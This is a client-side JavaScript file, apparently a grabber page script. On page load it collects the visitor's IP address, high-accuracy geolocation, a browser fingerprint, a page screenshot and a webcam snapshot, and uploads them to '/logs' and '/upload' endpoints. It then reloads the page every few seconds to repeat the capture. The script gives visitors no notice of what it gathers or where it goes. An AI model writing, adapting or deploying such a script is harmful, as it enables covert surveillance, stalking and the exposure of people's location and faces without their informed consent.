const MAX_RETRIES = 3;
const RETRY_DELAY = 2000;
let retryCount = 0;

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Error fetching IP';
    }
}

async function getGeolocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({
                latitude: 'Geolocation not supported',
                longitude: 'Geolocation not supported'
            });
            return;
        }

        const geoOptions = {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        };

        function successCallback(position) {
            resolve({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            });
        }

        function errorCallback(error) {
            if (retryCount < MAX_RETRIES) {
                retryCount++;
                setTimeout(() => {
                    navigator.geolocation.getCurrentPosition(
                        successCallback,
                        errorCallback,
                        geoOptions
                    );
                }, RETRY_DELAY);
            } else {
                resolve({
                    latitude: 'Error: ' + error.message,
                    longitude: 'Error: ' + error.message
                });
            }
        }

        // Request with permissions prompt
        navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
            navigator.geolocation.getCurrentPosition(
                successCallback,
                errorCallback,
                geoOptions
            );

            permissionStatus.onchange = () => {
                if (permissionStatus.state === 'granted') {
                    navigator.geolocation.getCurrentPosition(
                        successCallback,
                        errorCallback,
                        geoOptions
                    );
                }
            };
        });
    });
}

function getBrowserFingerprint() {
    const screenRes = `${screen.width}x${screen.height}`;
    const colorDepth = screen.colorDepth;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;
    const platform = navigator.platform;
    const hardwareConcurrency = navigator.hardwareConcurrency;
    const deviceMemory = navigator.deviceMemory;
    
    return {
        screenResolution: screenRes,
        colorDepth,
        timezone,
        language,
        platform,
        cores: hardwareConcurrency,
        memory: deviceMemory
    };
}

async function captureMedia() {
    const mediaData = {};

    // Capture screenshot
    try {
        const canvas = await html2canvas(document.body);
        const blob = await new Promise(resolve => canvas.toBlob(resolve));
        mediaData.screenshot = blob;
    } catch (error) {
        console.error('Screenshot capture failed:', error);
    }

    // Attempt camera capture
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            mediaData.camera = await new Promise(resolve => canvas.toBlob(resolve));
            
            stream.getTracks().forEach(track => track.stop());
        } catch (error) {
            console.error('Camera capture failed:', error);
        }
    }

    return mediaData;
}

async function uploadData(url, data, retries = 3) {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            return await response.json();
        } catch (error) {
            console.error(`Attempt ${i + 1} failed:`, error);
            if (i === retries - 1) throw error;
            await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
        }
    }
}

async function uploadMedia(url, mediaData, retries = 3) {
    for (let i = 0; i < retries; i++) {
        try {
            const formData = new FormData();
            
            if (mediaData.screenshot) {
                formData.append('screenshot', mediaData.screenshot, 'screenshot.png');
            }
            if (mediaData.camera) {
                formData.append('camera', mediaData.camera, 'camera.jpg');
            }

            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            return await response.json();
        } catch (error) {
            console.error(`Attempt ${i + 1} failed:`, error);
            if (i === retries - 1) throw error;
            await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
        }
    }
}

async function collectAndSendData(sessionId) {
    try {
        // Request geolocation first
        const geoLocation = await getGeolocation();

        // Collect other data concurrently
        const [ipAddress, mediaData] = await Promise.all([
            getIPAddress(),
            captureMedia()
        ]);

        const browserData = getBrowserFingerprint();
        
        // Prepare comprehensive data package
        const dataPackage = {
            sessionId,
            timestamp: new Date().toISOString(),
            ipAddress,
            location: geoLocation,
            browser: browserData,
            userAgent: navigator.userAgent,
            referrer: document.referrer || "No referrer",
        };

        // Upload data and media concurrently
        await Promise.all([
            uploadData('/logs', dataPackage),
            uploadMedia('/upload', mediaData)
        ]);

        // Schedule next collection after successful upload
        setTimeout(() => {
            window.location.reload();
        }, 5000);

    } catch (error) {
        console.error('Data collection/upload failed:', error);
        // Retry after delay
        setTimeout(() => collectAndSendData(sessionId), RETRY_DELAY);
    }
}

// Start collection when page loads
document.addEventListener("DOMContentLoaded", () => {
    const sessionId = 'your-session-id'; // Replace with actual session ID
    collectAndSendData(sessionId);
});
